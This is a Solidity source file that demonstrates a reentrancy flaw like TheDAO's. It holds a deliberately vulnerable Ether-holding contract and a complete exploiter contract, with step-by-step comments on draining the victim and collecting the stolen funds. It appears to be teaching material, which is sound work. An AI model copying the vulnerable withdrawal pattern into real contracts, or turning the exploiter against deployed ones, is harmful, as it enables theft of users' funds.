pragma solidity 0.4.11;

/*
Example contract which can receive Ether and the owner can later claim them back.
The contract exposes a recursive call vulnerability similar to those seen in TheDAO in 2016.
*/

contract keepMyEther {
    mapping(address => uint) public balances;
    
    function () payable {
        balances[msg.sender] += msg.value;
    }
    
    function getMyEther() {
        // the following line introduces the vulnerability
        // instead of address.call (which forwards all gas)
        // always use address.send!
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
    
    function getTotalBalance() constant returns (uint) {
        return this.balance;
    }
    
    function getMyAddress() constant returns (address) {
        return msg.sender;
    }
}

/*
This is the exploiter contract which recursively calls the keepMyEther victim contract.
To extract all Ether from the victim:
- first set the address of the keepMyEther contract via setVictim
- next send in into keepMyEther via delegateIncreaseBalance (send Ether along)
- the fallback function triggers the exploit by just sending any transaction to the exploiter address
- finally, the collected funds can be claimed back from the exploiter contract via the collectprey function
*/

contract exploiter {
    keepMyEther victim;
    address owner;

    function exploiter() {
        owner = msg.sender;
    }
    
    modifier onlyOwner () {
        if (msg.sender != owner)
            throw;
        _;
    }
    
    function setVictim(keepMyEther _victim) {
        victim = _victim;
    }
    
    function delegateIncreaseBalance() payable {
        victim.call.value(msg.value)();
    }
    
    function () payable {
        // here the recursive call gets invoked and keeps going until
        // we are out of gas or the victim contract has no Ether left
        victim.getMyEther();
    }
    
    function collectprey() onlyOwner {
        owner.send(this.balance);
    }
}
